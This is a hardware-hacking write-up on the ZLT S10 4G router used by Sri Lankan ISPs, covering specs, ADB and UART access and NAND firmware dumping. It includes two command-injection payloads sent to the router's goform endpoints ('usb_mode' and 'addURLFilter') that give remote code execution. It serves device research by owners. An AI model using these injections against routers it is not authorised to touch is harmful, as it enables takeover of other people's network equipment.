# Let's Hacking Into ZLT S10 4G CAT4 CPE

![\*Device Image\*](/assets/images/ZLT_S10.png)

The ZLT S10 4G CAT4 CPE is a widely used, low-cost router offered by ISPs for home broadband connections in Sri Lanka. This device manufactured by Tozed Kangwei, provides customized versions to meet specific ISPs’ requirements.

Although the manufacturers advertise the ZLT S10 with an extensive list of specifications, the versions provided to end users often come with significant limitations, such as restricted frequency bands and reduced functionality.

In Sri Lanka, ISPs like Mobitel and Hutch supply ZLT S10 routers that can easily unlocked or openlined by tweaking system configurations. However, routers provided by Dialog Axiata include additional layers of restrictions, going beyond standard configuration settings and making it more challenging for users to unlock or modify the device.

[[toc]]

## Device Specifications

### Hardware Specifications

**Hardware**
|   |   |
| ------------------------ | --------------------------- |
| Chipset                  | ZX297520V3E                 |
| RAM                      | 64Mb (?)                    |
| Flash                    | 128Mb (DS35M1GA-IB) (NAND)  |
| Architecture             | ARMv7                       |
| Ports                    | USB x1; RJ45 x1             |
| Buttons                  | WPS; WIFI; Reset            |

**Frequency Bands**
|   |   |
| ------------------------ | ------------------------------------- |
| LTE Bands (TDD)          | 38, 39, 40, 41                        |
| LTE Bands (FDD)          | 1, 2, 3, 4, 5, 7, 8, 20, 28           |
| LTE Bands (FDD)\*\*      | 12, 13, 17, 66                        |
| HSPA/UMTS Bands          | B1, B2, B5, B9                        |
| GSM Bands                | 850MHz; 900MHz; 1800MHz; 1900MHz      |
| LTE MIMO                 | Tx 1; Rx 2                            |
| LTE Antenna              | Built-in 2(3dBi); External 2(5dBi)    |
| LTE Max Throughput       | Up 150Mbps; Down 50Mbps               |

**WiFi**
|  |  |
| ------------------------ | ------------------------------------- |
| Wi-Fi Frequency          | 2.4 GHz                               |
| Wi-Fi Antenna            | Build-in 2(3dBi); External None       |
| Wi-Fi protocols          | ??                                    |
| Wi-Fi MIMO               | Tx 2; Rx 2                            |

<details>
<summary>Band Info (LK)</summary>

#### Band Info (LK)

> [!NOTE]
> This list includes only the frequency bands actively used by Sri Lankan ISPs for GSM, HSPA/HSPA+/UMTS, and LTE technologies.

##### *GSM*
| Band Name          | Used By                     |
| ------------------ | --------------------------- | 
| B? 900MHz (E-GSM)  | Mobitel/Dialog/Hutch/Airtel |
| B? 1800MHz (DCS)   | Mobitel/Dialog/Hutch/Airtel |

##### *HSPA/UMTS*
| Band Name  | Used By                     |
| ---------- | --------------------------- | 
| B1 2100MHz | Mobitel/Dialog/Hutch/Airtel | 

##### *LTE FDD*
| Band Name      | Used By              |
| -------------- | -------------------- |
| B1 (2100MHz)   | Mobitel/Airtel       |
| B3 (1800MHz +) | Mobitel/Dialog/Hutch |
| B5 (850MHz)    | Airtel               |
| B7 (2600MHz)   | Airtel               |
| B8 (900MHz)    | Mobitel/Hutch        |

##### *LTE TDD*
| Band Name   | Used By |
| ----------- | ------- |
| B40 2300MHz | Dialog  |
| B41 2500MHz | Mobitel |

</details>

---


### Software Specifications

|                   |  |
| ----------------- | -------------- |
|  Kernel           | Linux-3.4      |
|  2nd Stage Loader | U-Boot 2011.09 |
|  Machine          | TSP ZX297520V3 |
|  File System      | UBI            |

---


## Getting Shell Access

Gaining shell access is a crucial step. Once you have shell access, the router is no longer a "black box" and you are able to interact directly with its underlying system.

> [!NOTE]
> There are several ways to gain shell access to the device. Depending on your current firmware version, some methods may or may not work as expected.

### Over Debug Interfaces

#### ADB (Android Debug Bridge)
> ADB provides high-level access to the device’s command-line interface, enabling you to run shell commands, transfer files, and debug the device. It can be accessed over USB or, with some workarounds, over the network.

To access ADB over USB;
1. You must modify the system configurations to support it 
2. You must have a USB male-to-male cable
3. You must install ADB drivers and have the ADB executable
4. You may need to login into the router as the admin

In older firmware versions, there was an option in the web configuration interface to enable ADB. However, this option is not available. In such cases, you can send the following requests to modify the system configuration to support ADB.

```shell
# Enable USB Support
url: http://[Gateway_IP]/goform/goform_get_cmd_process
method: POST
payload: {'isTest': 'false', 'goformId': 'TZ_SET_USB_STATUS', 'usbPortEnable': '1', 'usbDownloadEnable': '1'}

# Enable ADB
url: http://[Gateway_IP]/goform/goform_get_cmd_process
method: POST
payload: {'isTest': 'false', 'goformId': 'TZ_CMD_SECURE_LOGIN', 'telnetdEnable': 'n', 'adbEnable': 'y', 'dropbearEnable': 'n'}
```
> [!TIP]
> Optionally, you can enable *telnet* and/or *dropbeer* by setting the corresponding values to `'y'`, which also can gain shell access but with a password (which we may never find).


#### UART (Universal Asynchronous Receiver-Transmitter)

![PCB](/assets/images/UART_JTAG.jpg)

> UART provides lower-level access to the device’s software (bootloader, kernel, etc.). It allows serial communication and is useful for debugging and monitoring/logging.

> [!CAUTION]
> Disassembling the router is required to access this interface. Disassembling the device may void your warranty. Proceed with caution.

To access UART;
1. You must have USB-to-TTL converter/adapter
2. You must correctly connect Rx, Tx and GND cables

On the device pins are organized as
```
[ Rx | GND | Tx ]
```

As shown in the image (orange box), there are a set of three pinholes. You can solder header pins, attach wires, or use clip connectors to access them. 

For software, you can use terminal applications like PuTTY on Windows, screen on Linux, or other similar tools to interact with the UART interface.


### Exploiting RCE Vulnerabilities
Certain Remote Code Execution (RCE) vulnerabilities stem from improper parsing, handling, or sanitization of arguments passed into the GoAhead backend. Although many of these flaws have been addressed and patched in recent firmware updates, some may still be present in older versions.

Exploit 1
```shell
url: http://[Gateway_IP]/goform/goform_set_cmd_process
method: POST
payload: {'isTest':'false', 'goformId':'USB_MODE_SWITCH', 'usb_mode':'6;<COMMAND>'}
```

Exploit 2
```shell
url: http://[Gateway_IP]/goform/goform_set_cmd_process
method: POST
payload: {'isTest':'false', 'goformId':'URL_FILTER_ADD', 'addURLFilter':'http://just_another_text/&&<COMMAND>&&'}
```
---


## Dumping Firmware

Sometimes, gaining shell access and dumping the full firmware is not straightforward or even possible. If you try UART, you may not be able to interrupt the bootloader. In such cases, dumping the firmware directly from the flash memory is an alternative, but it can be destructive. You may need to desolder the chip, which requires expensive equipment (like a hot air station) and experience. If done incorrectly, you risk damaging the chip, melting nearby components, or creating unwanted connections, ultimately rendering the device unusable.

### NAND Flash

<p float="left">
	<img src="/assets/images/Actual_DS35M1GA-IB.jpg" width="200"/>
	<img src="/assets/images/Size_DS35M1GA-IB.jpg" width="200"/>
</p>

As outlined in the hardware specifications of the device, this router is equipped with an 8-lead WSON NAND Flash chip (DS35M1GA-IB). Clipping WSON chips is extremely difficult. To access the chip, you must either solder wires directly to the chip while it on the PCB or remove the chip for easier connection, either by soldering it to a separate PCB or using a socket.

I initially attempted the first method—soldering wires directly to the chip. While it may seem nearly impossible, using very thin copper wire can make this task feasible and it works perfectly with careful handling.

![hooking](/assets/images/Hooking_DS35M1GA-IB.jpg)
![pinout](/assets/images/Pinout_DS35M1GA-IB.png)

> [!INFO]
> For further info about the chip, [refer this document](/assets/documents/Dosilicon-DS35M1GA-IB_C725999.pdf).

To read the chip, you will need a NAND Flash chip reader, such as the CH341. Additionally, since this chip operates at 1.8V, an adapter is required to match its voltage.




